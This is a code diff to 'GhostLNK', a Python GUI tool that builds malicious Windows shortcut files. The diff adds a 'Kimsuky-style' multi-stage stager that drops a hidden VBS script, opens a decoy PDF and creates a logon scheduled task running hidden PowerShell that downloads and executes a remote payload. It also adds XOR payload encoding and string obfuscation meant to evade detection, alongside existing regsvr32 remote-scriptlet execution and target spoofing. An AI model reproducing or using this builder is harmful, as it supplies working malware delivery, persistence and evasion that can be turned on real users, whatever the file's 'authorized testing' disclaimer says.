@@ -3,7 +3,6 @@
 GhostLNK - Professional LNK Generator with Advanced Evasion
 Created by: github.com/Excalibra
 Coded for educational and authorized testing purposes only
-TempleOS Inspired Interface
 """
 
 import os
@@ -14,6 +13,8 @@ import subprocess
 import re
 import tempfile
 import time
+import uuid
+import random
 from datetime import datetime
 from pathlib import Path
 
@@ -397,9 +398,7 @@ class LNKEngine:
         # --- regsvr32 mode overrides everything ---
         if regsvr32_unc:
             target_path = r"C:\Windows\System32\regsvr32.exe"
-            # Typical fileless execution: regsvr32 /s /n /i:http://server/file.sct scrobj.dll
             arguments = f'/s /n /i:"{regsvr32_unc}" scrobj.dll'
-            # regsvr32 is not powershell, so disable powershell-specific flags
             hide_powershell = False
             stealth_level = 0
             use_proxy = False
@@ -491,10 +490,8 @@ class LNKEngine:
 
         # --- LNK Stomping: Override the displayed target path ---
         if spoof_target_path:
-            # Build a shell item list for the fake target
             fake_id_list = LNKEngine._build_shell_item_list(spoof_target_path)
             lnk.shell_item_id_list = fake_id_list
-            # Also update link info to match the fake path (optional but helps consistency)
             lnk._link_info.local_base_path = spoof_target_path
         else:
             # Normal shell item list
@@ -530,7 +527,7 @@ class LNKEngine:
 
 
 class GhostLNKGUI(QMainWindow):
-    """Main GUI Window - GhostLNK with TempleOS Aesthetic"""
+    """Main GUI Window - GhostLNK"""
 
     ICON_DATABASE = {
         "PDF Document": (r"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe", 11, ".pdf"),
@@ -572,12 +569,11 @@ class GhostLNKGUI(QMainWindow):
     def init_ui(self):
         self.setWindowTitle("GhostLNK :: Advanced Evasion :: github.com/Excalibra")
         screen = QApplication.primaryScreen().availableGeometry()
-        window_width = int(screen.width() * 0.70)
-        window_height = int(screen.height() * 0.90)
+        window_width = int(screen.width() * 0.70)   # Narrower
+        window_height = int(screen.height() * 0.90) # Taller
         self.setGeometry(50, 50, window_width, window_height)
         self.setMinimumSize(1000, 800)
 
-        # TempleOS-inspired stylesheet with neon green scrollbars
         self.setStyleSheet("""
             QMainWindow { background-color: #000000; }
             QLabel { color: #00FFFF; font-size: 11px; font-family: "Courier New", monospace; }
@@ -681,13 +677,11 @@ class GhostLNKGUI(QMainWindow):
         main_layout.setSpacing(5)
         main_layout.setContentsMargins(8, 8, 8, 8)
 
-        # ----- Header Row: Left (Title/Credit/Subtitle) | Right (Console) -----
         header_widget = QWidget()
         header_layout = QHBoxLayout(header_widget)
         header_layout.setContentsMargins(0, 0, 0, 0)
         header_layout.setSpacing(10)
 
-        # Left side: branding
         left_header = QWidget()
         left_layout = QVBoxLayout(left_header)
         left_layout.setSpacing(2)
@@ -708,7 +702,7 @@ class GhostLNKGUI(QMainWindow):
         subtitle.setStyleSheet("color: #00FFFF; font-size: 10px; font-family: 'Courier New', monospace;")
         left_layout.addWidget(subtitle)
 
-        header_layout.addWidget(left_header, 1)
+        header_layout.addWidget(left_header, 1)  # stretch
 
         # Right side: Console Output (compact)
         console_group = QGroupBox("Console Output")
@@ -733,7 +727,7 @@ class GhostLNKGUI(QMainWindow):
 
         # ----- Main Splitter (Builder Panels) -----
         splitter = QSplitter(Qt.Orientation.Horizontal)
-        main_layout.addWidget(splitter, 1)  # take all remaining space
+        main_layout.addWidget(splitter, 1)
 
         left_scroll = QScrollArea()
         left_scroll.setWidgetResizable(True)
@@ -752,10 +746,11 @@ class GhostLNKGUI(QMainWindow):
         self.statusBar().setStyleSheet("color: #00FFFF; font-family: 'Courier New', monospace;")
 
         self.create_menu()
-        self.log("GhostLNK initialized - Embedded Payload, LNK Stomping & regsvr32 Proxy")
+        self.log("GhostLNK initialized - Kimsuky-inspired upgrades active")
         self.log("[OK] Custom executable target, stealth levels, hidden window")
         self.log("[OK] Advanced Evasion: conhost proxy, LNK Stomping, regsvr32 fileless")
-        self.log("[OK] Embedded Payload: self-decoding scripts with no network calls")
+        self.log("[OK] Embedded Payload: XOR encoding & string obfuscation")
+        self.log("[OK] Multi-Stage Stager: LNK -> VBS -> Scheduled Task")
 
     def create_converter_panel(self):
         panel = QWidget()
@@ -1039,10 +1034,32 @@ class GhostLNKGUI(QMainWindow):
         regsvr_layout.addWidget(self.regsvr_url)
         evasion_layout.addLayout(regsvr_layout)
 
+        # Multi-Stage Stager (Kimsuky style)
+        self.multistage_cb = QCheckBox("Multi-Stage Stager (Drop VBS + Schedule Task)")
+        self.multistage_cb.setToolTip(
+            "Generate a multi-stage attack chain:\n"
+            "LNK -> drops VBS in hidden folder -> opens decoy PDF -> schedules task for final payload."
+        )
+        self.multistage_cb.toggled.connect(self.toggle_multistage)
+        evasion_layout.addWidget(self.multistage_cb)
+        self.multistage_widget = QWidget()
+        multistage_layout = QVBoxLayout(self.multistage_widget)
+        multistage_layout.setContentsMargins(10, 5, 10, 5)
+        multistage_layout.addWidget(QLabel("Decoy PDF URL:"))
+        self.decoy_url = QLineEdit()
+        self.decoy_url.setPlaceholderText("https://example.com/decoy.pdf")
+        multistage_layout.addWidget(self.decoy_url)
+        multistage_layout.addWidget(QLabel("Final Payload URL:"))
+        self.payload_url = QLineEdit()
+        self.payload_url.setPlaceholderText("https://example.com/launcher.ps1")
+        multistage_layout.addWidget(self.payload_url)
+        self.multistage_widget.setVisible(False)
+        evasion_layout.addWidget(self.multistage_widget)
+
         evasion_group.setLayout(evasion_layout)
         layout.addWidget(evasion_group)
 
-        # Embedded Payload (No Network)
+        # Embedded Payload (No Network) with XOR & Obfuscation
         embedded_group = QGroupBox("Embedded Payload (No Network)")
         embedded_layout = QVBoxLayout()
 
@@ -1063,9 +1080,27 @@ class GhostLNKGUI(QMainWindow):
         encoding_layout.addWidget(self.encoding_combo)
         embedded_layout.addLayout(encoding_layout)
 
+        # XOR Encoding option
+        xor_layout = QHBoxLayout()
+        self.xor_cb = QCheckBox("XOR Encode")
+        self.xor_cb.setToolTip("Encrypt the script with XOR before embedding. The decoding stub will handle decryption.")
+        xor_layout.addWidget(self.xor_cb)
+        xor_layout.addWidget(QLabel("Key:"))
+        self.xor_key = QLineEdit()
+        self.xor_key.setPlaceholderText("0x5A or 'mykey'")
+        self.xor_key.setEnabled(False)
+        self.xor_cb.toggled.connect(lambda checked: self.xor_key.setEnabled(checked))
+        xor_layout.addWidget(self.xor_key)
+        embedded_layout.addLayout(xor_layout)
+
+        # String Obfuscation option
+        self.obfuscate_cb = QCheckBox("Obfuscate Strings (Character Concatenation)")
+        self.obfuscate_cb.setToolTip("Break up suspicious strings like 'powershell' into ('po'+'wer'+'she'+'ll')")
+        embedded_layout.addWidget(self.obfuscate_cb)
+
         self.embedded_generate_btn = QPushButton("Generate Embedded Payload")
         self.embedded_generate_btn.setToolTip(
-            "Encode the script and create a self-decoding PowerShell command.\n"
+            "Encode the script and create a self‑decoding PowerShell command.\n"
             "The resulting payload is embedded directly in the LNK command line."
         )
         self.embedded_generate_btn.clicked.connect(self.generate_embedded_payload)
@@ -1118,7 +1153,7 @@ class GhostLNKGUI(QMainWindow):
         self.desc_input.setMaximumHeight(50)
         desc_layout.addWidget(self.desc_input)
         gen_desc_btn = QPushButton("Generate Description")
-        gen_desc_btn.setMaximumWidth(120)
+        gen_desc_btn.setMinimumWidth(150)
         gen_desc_btn.clicked.connect(self.generate_desc)
         desc_layout.addWidget(gen_desc_btn)
         desc_group.setLayout(desc_layout)
@@ -1158,8 +1193,13 @@ class GhostLNKGUI(QMainWindow):
         self.stomp_path.setEnabled(not enabled and self.stomp_cb.isChecked())
         self.regsvr_cb.setEnabled(not enabled)
         self.regsvr_url.setEnabled(not enabled and self.regsvr_cb.isChecked())
+        self.multistage_cb.setEnabled(not enabled)
+        self.multistage_widget.setVisible(not enabled and self.multistage_cb.isChecked())
         self.embedded_input.setEnabled(not enabled)
         self.encoding_combo.setEnabled(not enabled)
+        self.xor_cb.setEnabled(not enabled)
+        self.xor_key.setEnabled(not enabled and self.xor_cb.isChecked())
+        self.obfuscate_cb.setEnabled(not enabled)
         self.embedded_generate_btn.setEnabled(not enabled)
         if enabled:
             self.mode_indicator.setText("Current Mode: RAW TARGET (Custom EXE)")
@@ -1172,6 +1212,9 @@ class GhostLNKGUI(QMainWindow):
             self.stealth_indicator.setText(f"Stealth: {['None', 'Moderate', 'Maximum'][self.stealth_combo.currentIndex()]}")
             self.hide_indicator.setText("PowerShell Window: Visible" if not self.hide_pwsh_cb.isChecked() else "PowerShell Window: HIDDEN")
             self.update_options()
+
+    def toggle_multistage(self, enabled):
+        self.multistage_widget.setVisible(enabled)
 
     def browse_raw_target(self):
         file_path, _ = QFileDialog.getOpenFileName(self, "Select Target Executable", "C:\\", "Executable Files (*.exe);;All Files (*)")
@@ -1212,7 +1255,9 @@ class GhostLNKGUI(QMainWindow):
             "<b>LNK Stomping (Target Spoofing):</b><br>"
             "Makes the LNK appear to point to a benign file while actually executing the payload.<br><br>"
             "<b>regsvr32.exe Proxy (Fileless):</b><br>"
-            "Uses regsvr32.exe to execute a remote scriptlet (SCT) or DLL hosted on a WebDAV/HTTP server."
+            "Uses regsvr32.exe to execute a remote scriptlet (SCT) or DLL hosted on a WebDAV/HTTP server.<br><br>"
+            "<b>Multi-Stage Stager:</b><br>"
+            "LNK drops a VBS script in a hidden folder, opens a decoy PDF, and creates a scheduled task for the final payload."
         )
 
     def show_embed_help(self):
@@ -1223,7 +1268,8 @@ class GhostLNKGUI(QMainWindow):
             "<b>Encoding:</b><br>"
             "- UTF-16LE: Required for standard PowerShell -E execution.<br>"
             "- UTF-8 / ASCII: Useful for custom stagers.<br><br>"
-            "The generated LNK contains no network calls."
+            "<b>XOR Encode:</b> Encrypt the script with a XOR key. The decoding stub will decrypt in memory.<br>"
+            "<b>String Obfuscation:</b> Break suspicious strings like 'powershell' into concatenated parts."
         )
 
     def show_raw_help(self):
@@ -1443,12 +1489,30 @@ class GhostLNKGUI(QMainWindow):
             self.mode_indicator.setText("Current Mode: Direct Base64 Payload")
             self.mode_indicator.setStyleSheet("color: #00FF00; font-weight: bold;")
 
+    def _xor_encode(self, data: bytes, key: bytes) -> bytes:
+        return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
+
+    def _obfuscate_strings(self, script: str) -> str:
+        """Break suspicious strings like 'powershell' into concatenated parts."""
+        suspicious = ["powershell", "PowerShell", "http://", "https://", "Invoke-Expression", "iex", "DownloadFile", "WebClient"]
+        result = script
+        for s in suspicious:
+            if s in result:
+                parts = [f"'{s[i:i+2]}'" for i in range(0, len(s), 2)]
+                replacement = "(" + "+".join(parts) + ")"
+                result = result.replace(s, replacement)
+        return result
+
     def generate_embedded_payload(self):
-        """Encode raw script and build self-decoding PowerShell command."""
+        """Encode raw script with optional XOR and string obfuscation, build self-decoding command."""
         script = self.embedded_input.toPlainText().strip()
         if not script:
             QMessageBox.warning(self, "Warning", "No script content provided.")
             return
+
+        # Apply string obfuscation if requested
+        if self.obfuscate_cb.isChecked():
+            script = self._obfuscate_strings(script)
 
         encoding_choice = self.encoding_combo.currentText()
         if "UTF-16LE" in encoding_choice:
@@ -1461,10 +1525,26 @@ class GhostLNKGUI(QMainWindow):
             encoding_name = "ASCII"
             script_bytes = script.encode('ascii', errors='ignore')
 
-        encoded_b64 = base64.b64encode(script_bytes).decode('ascii')
-
-        # Build the decoding stub
-        ps_command = f"$d='{encoded_b64}';[System.Text.Encoding]::{encoding_name}.GetString([System.Convert]::FromBase64String($d))|iex"
+        # Apply XOR if requested
+        if self.xor_cb.isChecked():
+            key_str = self.xor_key.text().strip()
+            if not key_str:
+                QMessageBox.warning(self, "Warning", "XOR key required.")
+                return
+            # If key looks like hex (0x5A), parse it
+            if key_str.startswith("0x"):
+                key_bytes = bytes([int(key_str, 16)])
+            else:
+                key_bytes = key_str.encode('utf-8')
+            script_bytes = self._xor_encode(script_bytes, key_bytes)
+            # We'll need to include the key in the decoding stub
+            key_b64 = base64.b64encode(key_bytes).decode('ascii')
+            xor_decoder = f"$k=[Convert]::FromBase64String('{key_b64}');$d=[Convert]::FromBase64String($d);for($i=0;$i -lt $d.Length;$i++){{$d[$i]=$d[$i] -bxor $k[$i % $k.Length]}};$d=[System.Text.Encoding]::{encoding_name}.GetString($d)"
+            encoded_b64 = base64.b64encode(script_bytes).decode('ascii')
+            ps_command = f"$d='{encoded_b64}';{xor_decoder}|iex"
+        else:
+            encoded_b64 = base64.b64encode(script_bytes).decode('ascii')
+            ps_command = f"$d='{encoded_b64}';[System.Text.Encoding]::{encoding_name}.GetString([System.Convert]::FromBase64String($d))|iex"
 
         # Encode the whole stub as UTF-16LE for use with -E
         final_encoded = base64.b64encode(ps_command.encode('utf-16le')).decode()
@@ -1472,7 +1552,7 @@ class GhostLNKGUI(QMainWindow):
 
         self.import_input.setText(final_arg)
         self.preview_label.setText(f"Arguments: {final_arg[:100]}...")
-        self.log(f"[OK] Embedded payload generated ({len(encoded_b64)} chars base64, {len(final_encoded)} chars final)")
+        self.log(f"[OK] Embedded payload generated ({len(encoded_b64)} chars base64, XOR: {self.xor_cb.isChecked()}, Obfuscate: {self.obfuscate_cb.isChecked()})")
         self.mode_indicator.setText("Current Mode: Embedded Payload (No Network)")
         self.mode_indicator.setStyleSheet("color: #00FF00; font-weight: bold;")
 
@@ -1488,6 +1568,29 @@ class GhostLNKGUI(QMainWindow):
         cursor.movePosition(cursor.MoveOperation.End)
         self.console.setTextCursor(cursor)
         QApplication.processEvents()
+
+    def _build_multistage_ps(self):
+        """Build the PowerShell stager that drops VBS, opens decoy, and schedules task."""
+        decoy = self.decoy_url.text().strip()
+        payload = self.payload_url.text().strip()
+        folder_name = f"MicrosoftEdge_{random.randint(10000,99999)}"
+        task_name = str(uuid.uuid4())
+        vbs_script = f'''
+Set objShell = CreateObject("Wscript.Shell")
+objShell.Run "powershell -WindowStyle Hidden -Command Invoke-Item '{decoy}'", 0, False
+objShell.Run "schtasks /create /tn {task_name} /tr \\"powershell -WindowStyle Hidden -Command iex (iwr '{payload}' -UseBasicParsing)\\" /sc ONLOGON /f", 0, False
+objShell.Run "schtasks /run /tn {task_name}", 0, False
+'''
+        vbs_b64 = base64.b64encode(vbs_script.encode('utf-16le')).decode()
+        ps_stager = f'''
+$f="$env:APPDATA\\Microsoft\\{folder_name}";
+mkdir $f -Force;
+attrib +h +s $f;
+$vbs=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('{vbs_b64}'));
+$vbs | Out-File -FilePath "$f\\update.vbs" -Encoding Unicode;
+Start-Process -FilePath "$f\\update.vbs" -WindowStyle Hidden;
+'''
+        return ps_stager.strip()
 
     def generate_lnk(self):
         try:
@@ -1511,21 +1614,40 @@ class GhostLNKGUI(QMainWindow):
                 use_proxy = False
                 spoof_target = None
                 regsvr32_unc = None
+                multistage = False
 
             else:
-                if not self.regsvr_cb.isChecked():
-                    arg = self.import_input.text().strip() or self.arg_display.toPlainText().strip()
-                    if not arg:
-                        QMessageBox.warning(self, "Warning", "No -E argument set (or import one first).")
+                # Check if multi-stage stager is enabled
+                if self.multistage_cb.isChecked():
+                    if not self.decoy_url.text().strip() or not self.payload_url.text().strip():
+                        QMessageBox.warning(self, "Warning", "Multi-Stage Stager requires Decoy URL and Payload URL.")
                         return
+                    ps_stager = self._build_multistage_ps()
+                    # Encode the stager
+                    encoded = base64.b64encode(ps_stager.encode('utf-16le')).decode()
+                    arg = f"-E {encoded}"
+                    target_path = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+                    arguments = arg
+                    working_dir = None
+                    use_proxy = self.proxy_cb.isChecked()
+                    spoof_target = self.stomp_path.text().strip() if self.stomp_cb.isChecked() else None
+                    regsvr32_unc = self.regsvr_url.text().strip() if self.regsvr_cb.isChecked() else None
+                    multistage = True
                 else:
-                    arg = ""
-                target_path = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
-                arguments = arg
-                working_dir = None
-                use_proxy = self.proxy_cb.isChecked()
-                spoof_target = self.stomp_path.text().strip() if self.stomp_cb.isChecked() else None
-                regsvr32_unc = self.regsvr_url.text().strip() if self.regsvr_cb.isChecked() else None
+                    if not self.regsvr_cb.isChecked():
+                        arg = self.import_input.text().strip() or self.arg_display.toPlainText().strip()
+                        if not arg:
+                            QMessageBox.warning(self, "Warning", "No -E argument set (or import one first).")
+                            return
+                    else:
+                        arg = ""
+                    target_path = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+                    arguments = arg
+                    working_dir = None
+                    use_proxy = self.proxy_cb.isChecked()
+                    spoof_target = self.stomp_path.text().strip() if self.stomp_cb.isChecked() else None
+                    regsvr32_unc = self.regsvr_url.text().strip() if self.regsvr_cb.isChecked() else None
+                    multistage = False
 
             icon = self.icon_combo.currentText()
             icon_path, icon_idx, ext = self.ICON_DATABASE[icon]
@@ -1547,7 +1669,7 @@ class GhostLNKGUI(QMainWindow):
                 stealth = self.stealth_combo.currentIndex()
                 hide = self.hide_pwsh_cb.isChecked()
                 mode = ["Download & Open", "Memory Execute", "Ultra Stealth"][self.type_combo.currentIndex()]
-                self.log(f"Generating LNK (PowerShell) - Mode: {mode}, Stealth: {['Normal','Moderate','Maximum'][stealth]}, Hide: {hide}, Proxy: {use_proxy}, Stomp: {bool(spoof_target)}, regsvr32: {bool(regsvr32_unc)}")
+                self.log(f"Generating LNK (PowerShell) - Mode: {mode}, Stealth: {['Normal','Moderate','Maximum'][stealth]}, Hide: {hide}, Proxy: {use_proxy}, Stomp: {bool(spoof_target)}, regsvr32: {bool(regsvr32_unc)}, MultiStage: {multistage}")
             else:
                 stealth = 0
                 hide = False
@@ -1632,7 +1754,8 @@ class GhostLNKGUI(QMainWindow):
             "> Hidden PowerShell Window option<br>"
             "> Raw Target Mode<br>"
             "> Advanced Evasion: conhost proxy, LNK Stomping, regsvr32 fileless<br>"
-            "> Embedded Payload: No network, self-decoding scripts<br><br>"
+            "> Multi-Stage Stager (Kimsuky style)<br>"
+            "> Embedded Payload with XOR & String Obfuscation<br><br>"
             "For authorized testing only")
 
 
